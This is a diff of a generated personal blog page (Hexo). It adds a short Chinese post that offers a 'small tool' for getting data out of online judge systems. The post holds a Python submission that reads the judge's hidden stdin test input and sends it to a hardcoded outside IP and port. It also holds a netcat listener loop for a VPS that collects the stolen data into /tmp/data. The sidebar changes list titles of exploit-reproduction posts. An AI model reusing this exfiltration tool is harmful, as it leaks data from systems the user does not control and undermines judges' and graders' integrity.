@@ -66,6 +66,82 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-在线oj获取数据" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2019/12/15/%E5%9C%A8%E7%BA%BFoj%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE/" class="article-date">
+  <time class="dt-published" datetime="2019-12-15T09:17:13.844Z" itemprop="datePublished">2019-12-15</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%9D%82/">杂</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2019/12/15/%E5%9C%A8%E7%BA%BFoj%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE/">在线oj获取数据</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="在线oj获取数据"><a href="#在线oj获取数据" class="headerlink" title="在线oj获取数据"></a>在线oj获取数据</h1><p>python3:</p>
+<pre><code class="python">import socket
+import sys    
+
+ip = &#39;39.108.164.219&#39;
+port = 60000
+
+def send_raw(raw):
+
+    try:
+        with socket.create_connection((ip, port), timeout=10) as conn:
+            conn.send(bytes(raw,encoding=&quot;ascii&quot;))
+            conn.close()
+    except:
+        return False  
+    return True
+
+data=&quot;&quot;
+for line in sys.stdin:
+    data+=line
+send_raw(data)
+</code></pre>
+<p>vps上运行</p>
+<pre><code class="shell">#!/bin/bash
+i=1
+while [ $i -eq 1 ]
+do 
+     nc -FNlp 60000  &gt;&gt; /tmp/data
+    echo -e  &quot;\n---------------------------------\n&quot; &gt;&gt; /tmp/data
+done
+</code></pre>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://explorersss.github.io/2019/12/15/在线oj获取数据/">https://explorersss.github.io/2019/12/15/在线oj获取数据/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://explorersss.github.io/2019/12/15/%E5%9C%A8%E7%BA%BFoj%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE/" data-id="ck46ssk1z0000zkv04m5h1xvn" data-title="在线oj获取数据" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-由cout和printf来对函数传参过程的探讨" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2019/12/14/%E7%94%B1cout%E5%92%8Cprintf%E6%9D%A5%E5%AF%B9%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E8%BF%87%E7%A8%8B%E7%9A%84%E6%8E%A2%E8%AE%A8/" class="article-date">
@@ -312,6 +388,10 @@ int main()
       <ul>
         
           <li>
+            <a href="/2020/02/12/phpcms960%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%8D%E7%8E%B0/">phpcms960任意文件上传复现</a>
+          </li>
+        
+          <li>
             <a href="/2020/02/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">记一次漏洞挖掘</a>
           </li>
         
@@ -325,10 +405,6 @@ int main()
         
           <li>
             <a href="/2020/02/08/Tomcat%20PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9ECVE-2017-12615/">Tomcat PUT方法任意写文件漏洞CVE-2017-12615</a>
-          </li>
-        
-          <li>
-            <a href="/2020/02/08/phpmyadmin%204.8.1%20rce/">phpmyadmin 4.8.1 rce</a>
           </li>
         
       </ul>
